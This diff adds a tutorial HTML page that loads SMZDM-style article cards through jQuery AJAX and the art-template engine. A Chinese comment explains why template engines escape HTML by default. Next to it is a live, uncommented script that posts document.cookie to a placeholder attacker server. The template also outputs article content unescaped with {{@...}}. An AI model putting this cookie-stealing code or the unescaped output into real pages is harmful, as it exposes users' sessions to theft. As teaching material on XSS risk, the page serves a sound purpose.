@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<title>SMZDM</title>
+	<style>
+		.items {
+			display: flex;
+			flex-wrap: wrap;
+		}
+
+		.item {
+			/*float: left;*/
+			width: 320px;
+			/*height: 320px;*/
+			border: 1px solid #0094ff;
+			overflow: hidden;
+			margin: 10px 20px;
+		}
+
+		.item .title {
+			display: block;
+			width: 100%;
+			position: relative;
+		}
+
+		.title img {
+			display: block;
+			width: 100%;
+		}
+
+		.title span {
+			position: absolute;
+			right: 20px;
+			bottom: 0px;
+			width: 50px;
+			text-align: center;
+			background-color: lightgray;
+			color: gray;
+			font-size: 13px;
+			border-radius: 5px 5px 0 0;
+		}
+
+		.content {
+			padding: 10px 0;
+		}
+
+		.content a {
+			text-decoration: none;
+			color: black;
+			font-family: "微软雅黑";
+			font-size: 16px;
+		}
+
+		.content p {
+			color: gray;
+			font-size: 13px;
+			font-family: "微软雅黑";
+			margin-bottom: 0;
+		}
+
+		.f_l {
+			float: left;
+		}
+
+		.f_r {
+			float: right;
+		}
+
+		.clearfix::before,
+		.clearfix::after {
+			content: '';
+			display: block;
+			line-height: 0;
+			height: 0;
+			clear: both;
+			visibility: hidden;
+		}
+
+		.clearfix {
+			zoom: 1;
+		}
+
+		.info {
+			line-height: 25px;
+		}
+
+		.info img {
+			width: 20px;
+			height: 20px;
+			vertical-align: middle;
+			margin-right: 10px;
+		}
+
+		.info a {
+			color: gray;
+			text-decoration: none;
+			font-size: 12px;
+			height: 20px;
+			line-height: 20px;
+			margin: 0 10px;
+		}
+
+		.getMore {
+			width: 100px;
+			height: 100px;
+			border: none;
+			text-align: center;
+			background-color: hotpink;
+			line-height: 100px;
+			cursor: pointer;
+			font-size: 20px;
+			font-weight: 900;
+		}
+
+		.getSome {
+			width: 100px;
+			height: 100px;
+			border: none;
+			text-align: center;
+			line-height: 100px;
+			cursor: pointer;
+			background-color: yellowgreen;
+			font-size: 20px;
+			font-weight: 900;
+		}
+
+		.controls {
+			display: flex;
+		}
+	</style>
+</head>
+
+<body>
+	<div class="controls">
+		<div class="getSome">获取多条
+		</div>
+	</div>
+	<!--容器-->
+	<div class="items">
+		<div class="item clearfix">
+			<a href="#" class="title">
+					<img src="imgs/novel02.jpg" alt="">
+					<span>12:43</span>
+				</a>
+			<div class="content">
+				<a href="#">#原创新人#HP 惠普 DeskJet 2132 喷墨一体机 开箱</a>
+				<p>前两天在发现频道爆料的惠普DeskJet 2132喷墨一体机今天到货了。搜了下张大妈没有关于这款一体机的开箱照，那我</p>
+			</div>
+			<div class="info clearfix">
+				<a href="#" class="f_l"><img src="imgs/icon02.jpg" alt="">liz82</a>
+				<a href="#" class="f_r">信息:2</a>
+				<a href="#" class="f_r">❤:2</a>
+				<a href="#" class="f_r">赞:2</a>
+			</div>
+		</div>
+	</div>
+</body>
+
+</html>
+
+<!--  导入 jQuery  -->
+<script src="./js/jquery-1.12.4.min.js"></script>
+<script src="./js/template-web.js"></script>
+<!-- 
+	模板引擎 处于安全考虑 默认不允许 解析html
+	需要人为的去设置 @ 让他被解析为 html结构
+	模板引擎 之所以这么做 是为了安全考虑
+	如果在数据中有如下的恶意代码 就会出现安全隐患
+ -->
+ <script>
+	//  浏览器端 也是可以 获取cookie
+	//  console.log(document.cookie);
+	// 盗取cookie
+	var xhr = new XMLHttpRequest()
+	xhr.open('post','他的服务器的地址.php');
+	xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+	xhr.send(document.cookie);
+ </script>
+<script id='template' type="text/html">
+
+{{each items}}
+	<div class="item clearfix">
+			<a href="#" class="title">
+					<img src="{{$value.article_img_url}}" alt="">
+					<span>{{$value.article_pub_date}}</span>
+				</a>
+			<div class="content">
+				<a href="#">{{$value.article_title}}</a>
+				<p>{{@$value.article_content}}</p>
+			</div>
+			<div class="info clearfix">
+				<a href="#" class="f_l"><img src="{{$value.article_author_avatar}}" alt="">{{$value.article_author_name}}</a>
+				<a href="#" class="f_r">信息:2</a>
+				<a href="#" class="f_r">❤:2</a>
+				<a href="#" class="f_r">赞:2</a>
+			</div>
+		</div>
+{{/each }}
+</script>
+<!-- 
+	模板引擎的使用步骤
+		0.导入模板引擎
+		1.定义模板 
+		2.挖坑 起名字
+		3.填充数据 使用
+ -->
+<!-- 
+	逻辑
+		点击 .getSome
+			ajax获取数据
+				回调函数
+				渲染到页面上	模板引擎
+ -->
+ <script>
+	 $(function(){
+		 $('.getSome').click(function(){
+			 $.ajax({
+				 url:'_api/smzdm_getSome.php',
+				 data:{
+					 num:10
+				 },
+				 success:function(backData){
+					 console.log(backData);
+					 var result = template('template',backData);
+					 console.log(result);
+					 $('.items').append(result);
+				 }
+			 })
+		 })
+	 })
+ </script>
+
